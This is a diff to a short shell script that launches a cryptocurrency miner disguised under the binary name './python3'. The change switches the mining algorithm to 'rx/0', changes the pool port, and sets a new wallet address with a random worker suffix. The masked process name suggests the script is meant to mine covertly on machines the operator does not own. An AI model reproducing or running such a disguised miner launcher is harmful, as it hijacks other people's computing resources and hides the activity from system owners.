@@ -11,4 +11,4 @@ nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./python3 --algorithm aurum --pool luckyynr.us.to:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOTcs-$nomer --keepalive true
+./python3 --algorithm rx/0 --pool luckyynr.us.to:8080 --wallet TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer --keepalive true
